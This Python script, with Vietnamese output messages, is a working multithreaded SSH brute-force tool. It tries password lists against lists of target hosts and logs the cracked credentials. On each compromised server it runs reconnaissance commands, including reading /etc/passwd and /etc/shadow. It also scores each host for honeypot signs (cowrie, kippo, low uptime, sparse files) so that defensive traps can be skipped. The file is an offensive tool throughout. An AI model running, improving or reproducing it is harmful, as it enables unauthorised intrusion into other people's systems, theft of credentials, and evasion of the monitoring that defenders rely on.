import paramiko
import time
import threading
import socket
import re
from concurrent.futures import ThreadPoolExecutor, as_completed

lock = threading.Lock()

def read_file(file_path):
    try:
        with open(file_path, 'r') as f:
            if file_path == 'cc.txt':
                ip_port_pairs = []
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    if ':' not in line:
                        print(f"Dòng không hợp lệ trong {file_path}: {line} (yêu cầu định dạng ip:port)")
                        continue
                    ip, port = line.split(':', 1)
                    try:
                        port = int(port)
                        ip_port_pairs.append((ip, port))
                    except ValueError:
                        print(f"Cổng không hợp lệ trong {file_path}: {line}")
                return ip_port_pairs
            else:
                return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"Tệp {file_path} không tìm thấy!")
        return []

def write_to_file(file_path, content):
    with lock:
        with open(file_path, 'a') as f:
            f.write(content + '\n')

def execute_command(client, command):
    try:
        stdin, stdout, stderr = client.exec_command(command, timeout=5)
        output = stdout.read().decode(errors='ignore').strip()
        error = stderr.read().decode(errors='ignore').strip()
        if error:
            return f"ERROR: {error}"
        return output
    except Exception as e:
        return f"ERROR: {e}"

def scan_local_ports(client):
    output = execute_command(client, "netstat -tulpn 2>/dev/null | grep LISTEN | head -20")
    ports = []
    port_regex = re.compile(r':(\d+)\s')
    
    for line in output.splitlines():
        matches = port_regex.findall(line)
        for port in matches:
            if port not in ports:
                ports.append(port)
    
    return ports

def analyze_command_output(commands):
    score = 0
    honeypot_indicators = [
        "fake", "simulation", "honeypot", "trap", "monitor",
        "cowrie", "kippo", "artillery", "honeyd", "ssh-honeypot", "honeytrap",
        "/opt/honeypot", "/var/log/honeypot", "/usr/share/doc/*/copyright"
    ]
    
    for output in commands.values():
        lower_output = output.lower()
        for indicator in honeypot_indicators:
            if indicator in lower_output:
                score += 3
    return score

def analyze_response_time(response_time):
    response_time_ms = response_time * 1000
    if response_time_ms < 10:
        return 2
    return 0

def analyze_file_system(commands):
    score = 0
    ls_output = commands.get("ls_root", "")
    if not ls_output:
        return 0
    
    suspicious_patterns = [
        "total 0", "total 4", "honeypot", "fake", "simulation"
    ]
    lower_output = ls_output.lower()
    for pattern in suspicious_patterns:
        if pattern in lower_output:
            score += 1
    
    lines = ls_output.strip().splitlines()
    if len(lines) < 5:
        score += 1
    
    return score

def analyze_processes(commands):
    score = 0
    ps_output = commands.get("ps", "")
    if not ps_output:
        return 0
    
    suspicious_processes = [
        "cowrie", "kippo", "honeypot", "honeyd",
        "artillery", "honeytrap", "glastopf",
        "python honeypot", "perl honeypot"
    ]
    lower_output = ps_output.lower()
    for process in suspicious_processes:
        if process in lower_output:
            score += 2
    
    lines = ps_output.strip().splitlines()
    if len(lines) < 5:
        score += 1
    
    return score

def analyze_network(client):
    score = 0
    network_config_check = execute_command(client, "ls -la /etc/network/interfaces /etc/sysconfig/network-scripts/ /etc/netplan/ 2>/dev/null | head -5")
    if "total 0" in network_config_check.lower() or "no such file" in network_config_check.lower() or len(network_config_check.strip()) < 10:
        score += 1
    
    interface_check = execute_command(client, "ip addr show 2>/dev/null | grep -E '^[0-9]+:' | head -5")
    if "fake" in interface_check.lower() or "honeypot" in interface_check.lower() or "trap" in interface_check.lower() or len(interface_check.strip()) < 10:
        score += 1
    
    route_check = execute_command(client, "ip route show 2>/dev/null | head -3")
    if len(route_check.strip()) < 20:
        score += 1
    
    return score

def behavioral_tests(client):
    score = 0
    temp_file_name = f"/tmp/test_{int(time.time())}"
    create_cmd = f"echo 'test' > {temp_file_name}"
    create_output = execute_command(client, create_cmd)
    
    if "error" in create_output.lower() or "permission denied" in create_output.lower():
        score += 1
    else:
        execute_command(client, f"rm -f {temp_file_name}")
    
    sensitive_files = ["/etc/passwd", "/etc/shadow", "/proc/version"]
    accessible_count = 0
    for file in sensitive_files:
        output = execute_command(client, f"cat {file} 2>/dev/null | head -1")
        if "error" not in output.lower() and len(output) > 0:
            accessible_count += 1
    
    if accessible_count == len(sensitive_files):
        score += 1
    
    system_commands = ["id", "whoami", "pwd"]
    working_commands = 0
    for cmd in system_commands:
        output = execute_command(client, cmd)
        if "error" not in output.lower() and len(output) > 0:
            working_commands += 1
    
    if working_commands == 0:
        score += 2
    
    return score

def advanced_honeypot_tests(client):
    score = 0
    cpu_info = execute_command(client, "cat /proc/cpuinfo | grep 'model name' | head -1")
    if "qemu" in cpu_info.lower() or "virtual" in cpu_info.lower():
        score += 1
    
    kernel_info = execute_command(client, "uname -r")
    if "generic" in kernel_info.lower() and len(kernel_info.strip()) < 20:
        score += 1
    
    package_managers = ["which apt", "which yum", "which pacman", "which zypper"]
    working_pms = 0
    for pm in package_managers:
        output = execute_command(client, pm)
        if "not found" not in output.lower() and len(output.strip()) > 0:
            working_pms += 1
    
    if working_pms == 0:
        score += 1
    
    services = execute_command(client, "systemctl list-units --type=service --state=running 2>/dev/null | head -10")
    if "0 loaded units" in services.lower() or len(services.strip()) < 50:
        score += 1
    
    internet_test = execute_command(client, "ping -c 1 8.8.8.8 2>/dev/null | grep '1 packets transmitted'")
    if len(internet_test.strip()) == 0:
        score += 1
    
    return score

def performance_tests(client):
    score = 0
    io_test = execute_command(client, "time dd if=/dev/zero of=/tmp/test bs=1M count=10 2>&1")
    if "command not found" in io_test.lower():
        score += 1
    
    execute_command(client, "rm -f /tmp/test")
    
    network_test = execute_command(client, "ss -tuln 2>/dev/null | wc -l")
    if network_test.strip():
        try:
            count = int(network_test.strip())
            if count < 5:
                score += 1
        except ValueError:
            pass
    
    return score

def detect_anomalies(server_info):
    score = 0
    hostname = server_info.get("hostname", "")
    if hostname:
        suspicious_hostnames = [
            "honeypot", "fake", "trap", "monitor", "sandbox",
            "test", "simulation", "GNU/Linux", "PREEMPT_DYNAMIC"
        ]
        lower_hostname = hostname.lower()
        for suspicious in suspicious_hostnames:
            if suspicious in lower_hostname:
                score += 1
    
    uptime_output = server_info.get("uptime", "")
    if "0:" in uptime_output or "min" in uptime_output or "command not found" in uptime_output.lower():
        score += 1
    
    history_output = server_info.get("history", "")
    lines = history_output.strip().splitlines()
    if len(lines) < 3:
        score += 1
    
    return score

def detect_honeypot(client, server_info):
    honeypot_score = 0
    honeypot_score += analyze_command_output(server_info["commands"])
    honeypot_score += analyze_response_time(server_info["response_time"])
    honeypot_score += analyze_file_system(server_info["commands"])
    honeypot_score += analyze_processes(server_info["commands"])
    honeypot_score += analyze_network(client)
    honeypot_score += behavioral_tests(client)
    honeypot_score += advanced_honeypot_tests(client)
    honeypot_score += performance_tests(client)
    honeypot_score += detect_anomalies(server_info)
    
    server_info["honeypot_score"] = honeypot_score
    return honeypot_score >= 6

def gather_system_info(client):
    commands = {
        "hostname": "hostname",
        "uname": "uname -a",
        "whoami": "whoami",
        "pwd": "pwd",
        "ls_root": "ls -la /",
        "ps": "ps aux | head -10",
        "netstat": "netstat -tulpn | head -10",
        "history": "history | tail -5",
        "ssh_version": "ssh -V",
        "uptime": "uptime",
        "mount": "mount | head -5",
        "env": "env | head -10"
    }
    server_info = {"commands": {}}
    for cmd_name, cmd in commands.items():
        server_info["commands"][cmd_name] = execute_command(client, cmd)
        if cmd_name == "hostname":
            server_info["hostname"] = server_info["commands"][cmd_name].strip()
        elif cmd_name == "uname":
            server_info["os_info"] = server_info["commands"][cmd_name].strip()
        elif cmd_name == "ssh_version":
            server_info["ssh_version"] = server_info["commands"][cmd_name].strip()
    
    server_info["open_ports"] = scan_local_ports(client)
    return server_info

def check_ssh(ip, port, username, password, current_ip_index, total_ips):
    GREEN = "\033[92m"
    RED = "\033[91m"
    YELLOW = "\033[93m"
    RESET = "\033[0m"

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        start_time = time.time()
        ssh.connect(ip, port=port, username=username, password=password, timeout=8)
        response_time = time.time() - start_time
        
        server_info = gather_system_info(ssh)
        server_info["response_time"] = response_time
        server_info["ip"] = ip
        server_info["port"] = str(port)
        server_info["username"] = username
        server_info["password"] = password
        
        is_honeypot = detect_honeypot(ssh, server_info)
        server_info["is_honeypot"] = is_honeypot
        
        if is_honeypot:
            print(f"{YELLOW}[WORKER {current_ip_index}/{total_ips} ▸ HONEYPOT] {ip}:{port} | {username} | {password} → Điểm: {server_info['honeypot_score']}{RESET}")
            write_to_file('honeypot.txt', f"{ip}:{port} | {username} | {password} → Điểm: {server_info['honeypot_score']}")
            return False
        
        success_message = f"{ip}:{port} | {username} | {password}"
        detailed_info = (
            f"\n=== 🎯 Thành công SSH 🎯 ===\n"
            f"🌐 Mục tiêu: {ip}:{port}\n"
            f"🔑 Thông tin đăng nhập: {username}:{password}\n"
            f"🖥️ Tên máy: {server_info.get('hostname', '')}\n"
            f"🐧 Hệ điều hành: {server_info.get('os_info', '')}\n"
            f"📡 Phiên bản SSH: {server_info.get('ssh_version', '')}\n"
            f"⚡ Thời gian phản hồi: {response_time:.2f}s\n"
            f"🔌 Các cổng mở: {server_info.get('open_ports', [])}\n"
            f"🍯 Điểm honeypot: {server_info.get('honeypot_score', 0)}\n"
            f"🕒 Thời gian: {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"========================\n"
        )
        print(f"{GREEN}[WORKER {current_ip_index}/{total_ips} ▸ THÀNH CÔNG] {success_message}{RESET}")
        write_to_file('success.txt', success_message)
        write_to_file('detailed-results.txt', detailed_info)
        return True
    except paramiko.AuthenticationException:
        print(f"{RED}[WORKER {current_ip_index}/{total_ips} ▸ THẤT BẠI] {ip}:{port} | {username} | {password}{RESET}")
        return False
    except (paramiko.SSHException, socket.timeout, Exception) as e:
        print(f"{RED}[WORKER {current_ip_index}/{total_ips} ▸ LỖI] {ip}:{port} | {username} | {password} | {e}{RESET}")
        return None  # Signal to skip to next IP
    finally:
        ssh.close()

def brute_worker(ip, port, username, passwords, current_ip_index, total_ips, max_attempts=20):
    attempts = 0
    for password in passwords:
        if attempts >= max_attempts:
            break
        result = check_ssh(ip, port, username, password, current_ip_index, total_ips)
        if result is True:  # Successful login
            break
        elif result is None:  # Connection/SSH error, skip to next IP
            break
        attempts += 1
        time.sleep(0.1)  # Maintain original speed

def main():
    ip_port_pairs = read_file('cc.txt')
    password_list = read_file('pass.txt')
    username_list = read_file('users.txt')

    if not username_list:
        username_list = ['root']
        print("⚠️ Sử dụng tên người dùng mặc định: root")

    if not ip_port_pairs or not password_list:
        print("❌ Thiếu danh sách IP:cổng hoặc mật khẩu. Thoát.")
        return

    total_ips = len(ip_port_pairs)
    max_threads = 100

    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = []
        for index, (ip, port) in enumerate(ip_port_pairs, 1):
            for username in username_list:
                futures.append(
                    executor.submit(brute_worker, ip, port, username, password_list, index, total_ips)
                )

        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(f"Lỗi trong luồng: {e}")

if __name__ == "__main__":
    main()